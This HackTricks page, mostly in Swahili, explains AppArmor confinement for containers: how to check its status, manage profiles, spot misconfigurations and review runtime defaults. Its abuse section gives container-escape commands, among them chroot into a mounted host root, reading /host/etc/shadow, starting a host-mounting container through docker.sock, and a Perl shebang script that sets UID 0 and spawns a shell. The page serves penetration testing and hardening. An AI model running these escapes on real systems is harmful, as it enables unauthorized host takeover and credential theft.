# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Muhtasari

AppArmor ni mfumo wa **Udhibiti wa Ufikiaji wa Lazima** unaoweka vizuizi kupitia profaili za kila programu. Tofauti na ukaguzi wa kawaida wa DAC, ambao unategemea sana umiliki wa mtumiaji na kundi, AppArmor inaruhusu kernel kutekeleza sera inayounganishwa na mchakato yenyewe. Katika mazingira ya container, hili ni muhimu kwa sababu workload inaweza kuwa na vibali vya kutosha vya jadi kujaribu kitendo na bado kukataliwa kwa sababu profaili yake ya AppArmor hairuhusu njia husika, mount, tabia ya mtandao, au matumizi ya capabilities.

Hoja muhimu zaidi kwa dhana ni kwamba AppArmor ni **path-based**. Inafikiria kuhusu ufikiaji wa filesystem kupitia sheria za njia badala ya lebo kama SELinux inavyofanya. Hii inafanya iwe rahisi kuelewa na yenye nguvu, lakini pia ina maana bind mounts na mpangilio mbadala wa njia yanastahili kuzingatiwa kwa makini. Ikiwa maudhui ya host yangefikika chini ya njia tofauti, athari za sera zinaweza zisifanane na yale mtendaji aliyoanza kuyatarajia.

## Jukumu Katika Utenganishaji wa Container

Mapitio ya usalama ya container mara nyingi yanakoma kwa capabilities na seccomp, lakini AppArmor bado ni muhimu baada ya ukaguzi huo. Fikiria container iliyo na leseni zaidi kuliko inavyostahili, au workload iliyo hitaji capability moja zaidi kwa sababu za uendeshaji. AppArmor bado inaweza kuweka vizingiti kwa ufikiaji wa faili, tabia za mount, networking, na miundo ya utekelezaji kwa njia zinazozuia njia za wazi za matumizi mabaya. Hii ndicho sababu ya kuzima AppArmor "ili tu kupata programu ifanye kazi" inaweza kimya kimya kubadilisha usanidi wenye hatari kuwa unaoweza kutumika kwa vitendo.

## Maabara

Ili kuangalia kama AppArmor iko hai kwenye host, tumia:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Ili kuona chini ya nini mchakato wa sasa wa container unaendesha:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Tofauti inafundisha. Katika kesi ya kawaida, mchakato unapaswa kuonyesha AppArmor context iliyohusishwa na profile iliyochaguliwa na runtime. Katika kesi ya unconfined, tabaka hilo la ziada la vikwazo linatoweka.

Unaweza pia kuchunguza kile Docker kinachodhani kimewekwa:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Matumizi ya wakati wa utekelezaji

Docker inaweza kutumia profaili ya AppArmor ya chaguo-msingi au iliyobinafsishwa pale mwenyeji anapoiunga mkono. Podman pia inaweza kuingiliana na AppArmor kwenye mifumo inayotumia AppArmor, ingawa kwenye distributions zinazoipa kipaumbele SELinux, mfumo mwingine wa MAC mara nyingi hupata nafasi kuu. Kubernetes inaweza kuonyesha sera ya AppArmor kwa kiwango cha workload kwenye nodi zinazounga mkono AppArmor. LXC na mazingira yanayohusiana ya system-container ya familia ya Ubuntu pia hutumia AppArmor kwa wingi.

Kwa vitendo, AppArmor si "Docker feature". Ni sifa ya kernel ya mwenyeji ambayo runtimes kadhaa zinaweza kuchagua kuitumia. Ikiwa mwenyeji hauiungi mkono au runtime imeambiwa kuendesha bila vikwazo (unconfined), ulinzi uliodhaniwa haupo kweli.

Kwenye wenyeji wa AppArmor wenye uwezo wa Docker, default inayojulikana zaidi ni `docker-default`. Profaili hiyo inatengenezwa kutoka kwa template ya AppArmor ya Moby na ni muhimu kwa sababu inaelezea kwanini baadhi ya PoCs zinazotegemea uwezo bado zinafeli katika container ya default. Kwa ujumla, `docker-default` inaruhusu networking ya kawaida, inakataza kuandika sehemu kubwa ya `/proc`, inakataza ufikiaji wa sehemu nyeti za `/sys`, inazuia operesheni za mount, na inapunguza ptrace ili isitumike kama njia ya kawaida ya kuchunguza mwenyeji. Kuelewa msingi huo kunasaidia kutofautisha "konteina ina `CAP_SYS_ADMIN`" na "konteina inaweza kweli kutumia uwezo huo dhidi ya kiolesura za kernel ninazohitaji".

## Usimamizi wa Profaili

Profaili za AppArmor kawaida huhifadhiwa chini ya `/etc/apparmor.d/`. Mazoea ya kawaida ya uandishi wa majina ni kubadilisha slashes katika njia ya executable na dots. Kwa mfano, profaili kwa `/usr/bin/man` mara nyingi huhifadhiwa kama `/etc/apparmor.d/usr.bin.man`. Undani huu una umuhimu wakati wa ulinzi na tathmini kwa sababu mara unapo jua jina la profaili inayotumika, mara nyingi unaweza kupata faili inayolingana haraka kwenye mwenyeji.

Amri za usimamizi muhimu upande wa mwenyeji ni pamoja na:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Sababu amri hizi zina umuhimu katika marejeleo ya container-security ni kwamba zinaeleza jinsi profiles zinavyojengwa, kupakiwa, kubadilishwa hadi complain mode, na kurekebishwa baada ya mabadiliko ya application. Ikiwa mwendeshaji ana tabia ya kuweka profiles kwenye complain mode wakati wa kutatua matatizo na kusahau kurejesha enforcement, container inaweza kuonekana kuwa imelindwa kwenye nyaraka ilhali kwa vitendo inafanya kazi kwa urahisi zaidi.

### Kuunda na Kusasisha Profiles

`aa-genprof` inaweza kutazama tabia ya application na kusaidia kuunda profile kwa njia ya maingiliano:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` inaweza kuunda profaili ya kiolezo ambayo baadaye inaweza kupakiwa na `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Wakati binary inabadilika na sera inahitaji kusasishwa, `aa-logprof` inaweza kucheza tena marufuku zilizopatikana kwenye logs na kumsaidia mwendeshaji kuamua kama kuwaruhusu au kuwakataa:
```bash
sudo aa-logprof
```
### Mafaili ya kumbukumbu

Kukanushwa kwa AppArmor mara nyingi kunaonekana kupitia `auditd`, syslog, au zana kama `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Hii ni muhimu kiutendaji na kwa mashambulizi. Watetezi hutumia ili kuboresha profiles. Washambuliaji hutumia ili kujua ni njia gani au operesheni gani hasa inakataliwa na ikiwa AppArmor ndiye udhibiti unaozuia exploit chain.

### Kutambua Faili Halisi la profile

Wakati runtime inaonyesha jina maalum la AppArmor profile kwa container, mara nyingi ni muhimu kuoanisha jina hilo na faili la profile kwenye diski:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Hii ni muhimu hasa wakati wa ukaguzi upande wa host kwa sababu inaunganisha pengo kati ya "the container says it is running under profile `lowpriv`" na "the actual rules live in this specific file that can be audited or reloaded".

## Usanidi usiofaa

Kosa linaloonekana zaidi ni `apparmor=unconfined`. Wasimamizi mara nyingi wanaloweka wakati wa debugging ya application iliyoshindwa kwa sababu profile ilizuia kwa usahihi kitu hatari au kisichotarajiwa. Ikiwa bendera hiyo itaendelea kuwepo kwenye production, safu yote ya MAC itakuwa imeondolewa kwa vitendo.

Tatizo jingine finyu ni kudhani kwamba bind mounts hazina madhara kwa sababu ruhusa za faili zinaonekana za kawaida. Kwa kuwa AppArmor inategemea path, kufichua host paths chini ya maeneo mbadala ya mount kunaweza kuingiliana vibaya na sheria za path. Kosa la tatu ni kusahau kwamba jina la profile kwenye faili ya config halina maana kubwa ikiwa kernel ya host haitekelezi AppArmor kwa kweli.

## Matumizi mabaya

Wakati AppArmor haipo, operesheni ambazo zilikuwa zimezuiwa awali zinaweza kufanya kazi ghafla: kusoma paths nyeti kupitia bind mounts, kufikia sehemu za procfs au sysfs ambazo zingeendelea kuwa ngumu zaidi kutumia, kufanya vitendo vinavyohusiana na mount kama capabilities/seccomp nazo zinaviruhusu, au kutumia paths ambazo profile ingezuia kwa kawaida. AppArmor mara nyingi ndio mekanizmo inayofafanua kwa nini jaribio la kuvunja kwa kutumia capabilities "should work" kwenye karatasi lakini bado linashindwa kwa vitendo. Ondoa AppArmor, na jaribio hilo linaweza kuanza kufanikiwa.

Ikiwa unashuku AppArmor ndiyo kitu kikuu kinachozuia mnyororo wa matumizi mabaya wa path-traversal, bind-mount, au mount-based, hatua ya kwanza kwa kawaida ni kulinganisha kile kinachopatikana na bila profile. Kwa mfano, ikiwa host path imefungwa ndani ya container, anza kwa kukagua ikiwa unaweza traverse na kuisoma it:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Ikiwa container pia ina capability hatari kama `CAP_SYS_ADMIN`, mojawapo ya majaribio yenye tija zaidi ni kuona ikiwa AppArmor ndiyo udhibiti unaozuia mount operations au ufikiaji wa sensitive kernel filesystems:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Katika mazingira ambapo host path tayari inapatikana kupitia bind mount, kupoteza AppArmor pia kunaweza kubadilisha read-only information-disclosure issue kuwa direct host file access:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Lengo la amri hizi si kwamba AppArmor pekee inasababisha breakout. Ni kwamba mara AppArmor itaondolewa, njia nyingi za matumizi mabaya zinazotegemea filesystem na mount zinaweza kujaribiwa mara moja.

### Mfano Kamili: AppArmor Disabled + Host Root Mounted

Ikiwa container tayari ina host root bind-mounted katika `/host`, kuondoa AppArmor kunaweza kugeuza njia iliyozuiliwa ya matumizi mabaya ya filesystem kuwa utorokeo kamili wa host:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Mara shell inapoendesha kupitia host filesystem, workload imefanikiwa kutoroka container boundary:
```bash
id
hostname
cat /etc/shadow | head
```
### Mfano Kamili: AppArmor Imezimwa + Runtime Socket

Ikiwa kizuizi halisi ulikuwa AppArmor unaozunguka hali ya runtime, socket iliyopachikwa inaweza kutosha kwa kutoroka kabisa:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Njia kamili inategemea mount point, lakini matokeo ni yale yale: AppArmor haifanyi tena kuzuia ufikaji kwa runtime API, na runtime API inaweza kuanzisha container inayoweza kuhujumu host.

### Mfano Kamili: Path-Based Bind-Mount Bypass

Kwa sababu AppArmor inategemea njia, kulinda `/proc/**` hakutalinda moja kwa moja yaliyomo ya procfs ya host wakati yanaweza kupatikana kupitia njia tofauti:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Athari inategemea hasa ni nini kimewekwa (mounted) na je, njia mbadala pia inavuka udhibiti mwingine; lakini muundo huu ni moja ya sababu zilizo wazi zaidi kwanini AppArmor inapaswa kutathminiwa pamoja na mpangilio wa mount badala ya kutathminiwa peke yake.

### Mfano Kamili: Shebang Bypass

Sera za AppArmor wakati mwingine zinalenga njia ya mfasiri kwa namna ambayo haisisitizi kikamilifu utekelezaji wa script kupitia utunzaji wa shebang. Mfano wa kihistoria ulihusisha kutumia script ambayo mstari wake wa kwanza unaelekeza kwa mfasiri aliyezuiliwa:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Mfano wa aina hii ni muhimu kama ukumbusho kwamba nia ya profile na semantiki halisi za utekelezaji zinaweza kutofautiana. Wakati ukikagua AppArmor katika mazingira ya container, minyororo ya interpreter na njia mbadala za utekelezaji zinastahili kipaumbele maalum.

## Checks

Lengo la ukaguzi huu ni kujibu maswali matatu kwa haraka: je, AppArmor imewezeshwa kwenye host, je, mchakato wa sasa umefungiwa, na je, runtime kwa kweli ilitumia profile kwenye container hii?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
What is interesting here:

- If `/proc/self/attr/current` shows `unconfined`, the workload is not benefiting from AppArmor confinement.
- If `aa-status` shows AppArmor disabled or not loaded, any profile name in the runtime config is mostly cosmetic.
- If `docker inspect` shows `unconfined` or an unexpected custom profile, that is often the reason a filesystem or mount-based abuse path works.

If a container already has elevated privileges for operational reasons, leaving AppArmor enabled often makes the difference between a controlled exception and a much broader security failure.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default on AppArmor-capable hosts | Uses the `docker-default` AppArmor profile unless overridden | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-dependent | AppArmor is supported through `--security-opt`, but the exact default is host/runtime dependent and less universal than Docker's documented `docker-default` profile | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Conditional default | If `appArmorProfile.type` is not specified, the default is `RuntimeDefault`, but it is only applied when AppArmor is enabled on the node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | Follows node/runtime support | Common Kubernetes-supported runtimes support AppArmor, but actual enforcement still depends on node support and workload settings | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

For AppArmor, the most important variable is often the **mwenyeji**, not only the runtime. A profile setting in a manifest does not create confinement on a node where AppArmor is not enabled.
{{#include ../../../../banners/hacktricks-training.md}}
